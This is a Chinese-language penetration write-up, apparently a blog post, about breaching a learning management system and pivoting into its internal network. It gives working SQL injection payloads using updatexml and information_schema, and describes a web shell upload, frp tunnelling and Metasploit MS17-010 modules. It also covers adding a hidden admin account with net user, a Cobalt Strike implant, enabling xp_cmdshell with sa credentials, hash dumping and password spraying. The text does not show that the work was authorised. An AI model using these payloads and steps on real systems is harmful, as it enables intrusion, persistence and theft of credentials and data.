从shell 到 内网的一次实战过程

记录一下自己踩的坑

探测目标
打开目标发现 是一个学习管理系统 用firefox 的 插件 wappalyzer 大致可以观测出目标网站的架构

信息搜集
用layer 跑了一遍同子站资产后 提取出ip 后 放入 脚本探测常用端口 后大致得到如下信息

初始一看 3306 8009 的对外开放 便开始相应测试但是在测试过程中发现 3306连接错误


且telnet 后 并未显示 banner 只是一个空显示


后面测试 8009 情况也是如此 故此常见端口 并没有发现什么特别有价值的信息

准备google 语法搜集一下同子站有没有其他泄露信息
  这里推荐一下Se7en 师傅的google-hack 工具 
   https://github.com/r00tSe7en/GoogleHackingTool

经过github和google一番搜集后 发现一些用户登入入口 以及sql下载 可惜的是初始化的sql没啥价值

再把相关的登录入口 以及 信息泄露的一些资料 做好存储 准备回过头来看网站

寻找漏洞

经过探测之后发现其他子站存在sql注入 其中几处sql 注入 不太好利用

发现是字符型注入用双引号包裹 这里我们要闭合” 但是最后测试下来并不是特别好利用 错误后的会返回到一个指定错误页面

最终在其他同子站下寻找到一处可利用的报错注入

这里只要闭合’ 就行
Payload class=1’ and 1=1–+

这里我用的是updatexml 报错注入进行


User 和version() 报出来后 我们知道不是root用户
且mysql版本是5.6以上
Mysql 大于5.6以后 默认 secure-file-priv 是 NULL
所以默认是写不了shell
不过可以用慢查询日志方法去试试
https://www.cnblogs.com/c1e4r/articles/8902444.html

Database() 并不是我们要的数据库 所以需要重新定位

这里引用小透明师傅教我的直接用information_schema 去定位

大部分数据库字段名 和 html表单的name 名称差不多 所以可以直接去定位

Payload
1’ and updatexml(1,concat(0x7e,(select concat(table_schema,’:’,table_name) from information_schema.columns where column_name =’account’ limit 13,1),0x7e),1)–+

这样就直接可以大致定位当前应用的table_name 以及table_schema

最终payload 为

最终使用注入获取到了相关用户密码

漏洞利用-登录加上传shell

登入后发现可以直接跳转到需要的目标网站 可见账户可能通用

在该应用下翻了翻可利用的地方发现一处编辑器上传 修改文件头后成功上传shell

内网渗透

蚁剑连接后

发现有三个网段
10.1.1.*
10.0.1.*
192.168.1.*

本地开了3306

使用frp 等类似代理软件将流量转发出来

然后翻一下web 的配置文件 可能配置文件或者用户文件有账户密码什么的

果不其然

打通隧道后使用navicat 连接查看

现在定位目标数据同理也是跟注入shell语法一样用 information_schema 去判断

最终成功定位表 以及数据 至此任务就成功啦

1.横向渗透 ms17-010
虚拟机 
配置proxy-chains 使用 socks5 代理 
然后加载msf 模块 auxiliary/admin/smb/ms17_010_command 探测 
 Windows 下也有可探测工具

-。-运气不好只探测到一台2003 的

使用 exploit/windows/smb/ms17_010_eternalblue 去执行的时候 发现并没有成功打到

推测可能有防火墙 smb 流量被拦截了

这时候不要慌 还有一个执行命令的模块
auxiliary/admin/smb/ms17_010_command
配置好相关设置 run 一波

Sysytem 权限
由于server2003没有powershell 无法使用cs 远程上线 

这里可以启用来宾账户即guest 
1.cmd 命令 net user guest /active:yes 或者添加隐藏账户 net user sttas$ stt123456 /add


使用命令添加账户 并添加到管理员  3389远程 上去   机器拿下

systeminfo 后发现机器是工作组
且 又多了一个网段 10.2.1.*

Cs 上线

使用cs 生成exe 复制到该台机器上并运行成功上线

信息搜集

抓一下hash
并没有抓到administratord的密码

抓到了一个账户的hash 但是没有解出来
放到cs的凭证里 以便后续使用psexec 去碰撞密码

在目标机器一阵寻找后发现 了一些有价值的信息

探测到该网段下192.168.1.153 的sqlserver
且同目录下txt 也发现一些价值信息

探测后发现192.168.1.153 是存活的 且3389 和1433 开启 为server2008 r2

运气很好的是 使用sa 跟其他机器的sa密码碰撞 是成功的
至此 192.168.1.153 有了sa 账户的权限

Mssql 的sa 权限可以执行 cmd 命令 所以我们可以直接用cs 生成powershell 命令上线
前提要开启mssql 的xp_cmd 扩展 

exec sp_configure 'show advanced options', 1;reconfigure;
exec sp_configure 'xp_cmdshell',1;reconfigure;
https://www.jianshu.com/p/6f8f4906b4cf

最终成功上线

导hash 后 抓取到Administrator的密码

但是使用psexec 挨个去横向 没有一个成功的-.-

信息利用

在回过头整理好之前收集的的密码 user 加 password 搜集起来
进行对应相应服务爆破

如数据库 ssh rdp smb 这种

Proxychains 代理好使用

果然发现了 ssh 有通用口令 且是root 我们测试一下看能否 登录

经过测试后 发现大部分ssh 的使用通用此密码

Mysql 爆破后 也找出了很多
可惜的是rdp 和 smb 并没有 成功

再统一搜集价值信息
